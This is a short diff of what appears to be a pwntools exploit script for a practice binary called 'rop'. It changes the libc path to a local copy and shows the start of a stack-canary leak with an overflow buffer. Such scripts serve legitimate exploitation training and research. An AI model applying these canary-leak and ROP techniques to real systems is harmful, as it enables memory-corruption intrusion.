@@ -4,7 +4,7 @@ def slog(name, addr): return success(": ".join([name, hex(addr)]))
 
 p = process("./rop")
 e = ELF("./rop")
-libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+libc = ELF("./libc-2.27.so")
 
 # [1] Leak canary
 buf = b"A"*0x39
